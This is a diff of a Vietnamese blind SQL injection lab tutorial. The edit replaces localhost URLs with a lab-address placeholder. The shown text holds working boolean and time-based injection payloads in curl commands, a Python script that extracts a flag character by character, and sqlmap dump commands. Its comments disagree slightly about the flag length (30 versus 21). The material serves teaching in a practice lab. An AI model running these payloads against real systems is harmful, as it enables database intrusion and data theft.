@@ -54,7 +54,10 @@ IF (điều kiện ĐÚNG, SLEEP(5), 0)   -- đúng → chờ 5 giây
 ```bash
 cd sqli-blind/lab
 docker compose up -d
-# Lab tại: http://localhost:7105
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là một trang tra cứu ID user: `id=1` hiện "User exists", `id=999` hiện "User not found" — **không lộ dữ liệu hay lỗi**. DB có bảng `secret_data` với 1 cột `flag`.
@@ -62,10 +65,10 @@ Lab là một trang tra cứu ID user: `id=1` hiện "User exists", `id=999` hi�
 ### Bước 2: Xác nhận blind boolean
 
 ```bash
-$ curl -s "http://localhost:7105/?id=1' AND 1=1-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND 1=1-- -"
 User exists
 
-$ curl -s "http://localhost:7105/?id=1' AND 1=2-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND 1=2-- -"
 User not found
 ```
 
@@ -79,7 +82,7 @@ Hỏi `LENGTH`:
 
 ```bash
 # Đúng nếu độ dài flag = 30
-$ curl -s "http://localhost:7105/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
 User exists
 ```
 
@@ -89,7 +92,7 @@ User exists
 
 ```bash
 # Đúng nếu ký tự đầu là 'F'
-$ curl -s "http://localhost:7105/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
 User exists
 ```
 
@@ -104,7 +107,7 @@ Thay vì gõ tay 30 ký tự × 30 lần thử, viết script:
 ```python
 import requests
 
-url = "http://localhost:7105/"
+url = "<LAB_ADDRESS>/"
 flag = ""
 for i in range(1, 22):           # 1..21 ký tự
     for code in range(32, 127):  # in được ASCII 32..126
@@ -125,7 +128,7 @@ print("FLAG:", flag)
 
 ```bash
 # Đúng → mất 5 giây, Sai → tức thì
-$ time curl -s "http://localhost:7105/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
+$ time curl -s "<LAB_ADDRESS>/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
 real 5.002s   # = ký tự đầu là 'F'
 ```
 
@@ -136,8 +139,8 @@ real 5.002s   # = ký tự đầu là 'F'
 ### Bước 7: sqlmap tự động (đã hiểu thì dùng)
 
 ```bash
-sqlmap -u "http://localhost:7105/?id=1" --batch --technique=B --dbs
-sqlmap -u "http://localhost:7105/?id=1" --batch -D lab_db -T secret_data --dump
+sqlmap -u "<LAB_ADDRESS>/?id=1" --batch --technique=B --dbs
+sqlmap -u "<LAB_ADDRESS>/?id=1" --batch -D lab_db -T secret_data --dump
 ```
 
 <!-- Output already described via CLI commands above -->
